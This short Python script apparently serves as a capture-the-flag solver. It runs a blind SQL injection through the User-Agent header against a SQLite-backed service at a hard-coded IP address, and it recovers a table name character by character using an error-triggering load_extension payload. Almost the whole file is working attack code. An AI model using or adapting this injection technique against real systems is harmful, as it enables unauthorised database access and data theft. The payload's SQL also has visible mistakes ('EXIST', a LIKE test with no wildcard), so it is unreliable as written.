import requests
table_name= ""
url = 'http://103.97.125.53:32753'
for c in "ABCDEFGHIJKLMNOPQRSTWXYZabcdefghijklmnopqrstwxyz0123456789{}_":
    payload = f"',null, null,null,CASE WHEN EXIST(SELECT * FROM sqlite_schema Where name like '{c}') THEN NULL ELSE load_extension(1)),(null,'"
    r = requests.get(url, headers={"User-Agent": payload})
    if "Logged" in r.text:
        table_name +=c
        print("Table is ", table_name)
print(table_name)